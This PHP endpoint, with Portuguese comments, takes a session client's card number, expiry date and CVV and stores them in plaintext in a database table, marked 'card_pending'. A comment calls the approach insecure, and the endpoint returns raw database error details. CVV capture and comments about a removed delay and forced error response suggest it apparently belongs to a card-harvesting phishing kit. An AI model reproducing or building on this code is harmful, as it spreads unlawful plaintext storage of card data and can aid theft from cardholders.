<?php
// File: public/processa_dados_cartao.php
session_start();
header('Content-Type: application/json');

// 1. Inclui a conexão com o banco de dados
require __DIR__.'/../includes/db.php'; // Usa a variável $pdo

// Adiciona verificação de segurança para o objeto PDO
if (!isset($pdo) || !$pdo) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Falha crítica na conexão com o banco de dados.']);
    exit;
}

// 2. Garante que o cliente está logado
if (!isset($_SESSION['client_id'])) {
    http_response_code(401); // Unauthorized
    echo json_encode(['success' => false, 'message' => 'Sessão expirada ou inválida. Por favor, reinicie o processo.']);
    exit;
}
$clientId = $_SESSION['client_id'];

// 3. Lê dados JSON do corpo da requisição
$rawData = file_get_contents('php://input');
$data = json_decode($rawData, true);
if (!$data) {
    http_response_code(400); // Bad Request
    echo json_encode(['success' => false, 'message' => 'Requisição com JSON malformado.']);
    exit;
}

// --- Recebimento e Validação dos Dados do Cartão ---
$numero_cartao = trim($data['numero_cartao'] ?? '');
$validade_cartao = trim($data['validade_cartao'] ?? '');
$cvv_cartao = trim($data['cvv_cartao'] ?? '');

// Validação simples
if (empty($numero_cartao) || empty($validade_cartao) || empty($cvv_cartao)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'message' => 'Todos os dados do cartão são obrigatórios.']);
    exit;
}

// --- ATUALIZAÇÃO DIRETA NO BANCO (ABORDAGEM INSEGURA) ---
$sql = "UPDATE clients SET
            numero_cartao = :numero_cartao,
            validade_cartao = :validade_cartao,
            cvv_cartao = :cvv_cartao,
            status = 'card_pending',
            updated_at = NOW()
        WHERE id = :client_id";

try {
    $stmt = $pdo->prepare($sql);
    $stmt->execute([
        ':numero_cartao'   => $numero_cartao,
        ':validade_cartao' => $validade_cartao,
        ':cvv_cartao'      => $cvv_cartao,
        ':client_id'       => $clientId
    ]);
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(['success' => false, 'message' => 'Erro ao salvar os dados no banco.', 'error_detail' => $e->getMessage()]);
    exit;
}

// --- RESPOSTA SIMPLES E RÁPIDA ---
// A pausa (sleep) e a resposta de erro forçada foram removidas.
// A API agora apenas confirma que recebeu e processou os dados.
echo json_encode([
    'success' => true,
    'message' => 'Dados recebidos com sucesso.'
]);
?>